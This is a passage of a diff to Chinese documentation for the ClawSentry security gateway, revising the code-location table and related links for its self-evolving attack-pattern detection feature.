+  -d '{"pattern_id": "EV-A3F8B2C1", "confirmed": true}'
 ```
 
 ---
@@ -510,18 +350,18 @@ pattern_id = f"EV-{cmd_hash[:8].upper()}"  # 例如 EV-A3F8B2C1
 ## 代码位置 {#code-locations}
 
 | 模块 | 路径 | 职责 |
-|------|------|------|
-| 自进化核心 | `src/clawsentry/gateway/pattern_evolution.py` | `EvolvedPattern` 数据结构、`EvolvedPatternStore` 持久化、`compute_confidence()` 评分、`promote_pattern()` 状态迁移、`PatternEvolutionManager` 编排 |
-| 模式加载与匹配 | `src/clawsentry/gateway/pattern_matcher.py` | `load_patterns()` 双源加载、`is_active` 过滤、`PatternMatcher` 匹配引擎 |
-| 内置模式库 | `src/clawsentry/gateway/attack_patterns.yaml` | 25 条内置核心模式（v1.1），不受进化管理 |
-| 配置集成 | `src/clawsentry/gateway/detection_config.py` | `DetectionConfig.evolving_enabled` + `evolved_patterns_path` 字段 |
-| REST API | `src/clawsentry/gateway/server.py` | `GET /ahp/patterns` + `POST /ahp/patterns/confirm` 端点实现 |
+|---|---|---|
+| 演进核心 | `src/clawsentry/gateway/pattern_evolution.py` | `EvolvedPattern`、`EvolvedPatternStore`、`compute_confidence()`、`promote_pattern()`、`PatternEvolutionManager` |
+| 模式加载/匹配 | `src/clawsentry/gateway/pattern_matcher.py` | `load_patterns()` 双源合并、`is_active` 过滤、`PatternMatcher.reload()` |
+| 内置规则集 | `src/clawsentry/gateway/attack_patterns.yaml` | 核心模式（≥ 25 条）；不由演进功能管理 |
+| 配置集成 | `src/clawsentry/gateway/detection_config.py` | `evolving_enabled` + `evolved_patterns_path` 字段 |
+| REST API | `src/clawsentry/gateway/server.py` | `GET /ahp/patterns`、`POST /ahp/patterns/confirm` |
 
 ---
 
 ## 相关页面
 
-- [攻击模式定制](attack-patterns.md) — 静态 YAML 攻击模式库（自进化的"种子"来源）
-- [L2 语义分析](../decision-layers/l2-semantic.md) — PatternMatcher 集成点，候选模式的触发层
-- [检测管线配置](../configuration/detection-config.md) — `CS_EVOLVING_ENABLED`、`CS_EVOLVED_PATTERNS_PATH` 参数
-- [REST API → /ahp/patterns](../api/decisions.md) — 模式确认/拒绝的 API 端点
+- [攻击模式](attack-patterns.md) — 演进模式所扩展的核心 YAML 规则集
+- [自定义分析器](custom-analyzer.md) — 集成了 `PatternMatcher` 的 L2 `RuleBasedAnalyzer`
+- [配置概览](../configuration/configuration-overview.md) — 包含 `CS_EVOLVING_ENABLED` 在内的所有环境变量
+- [API 概览](../api/overview.md) — REST 端点的认证与错误处理
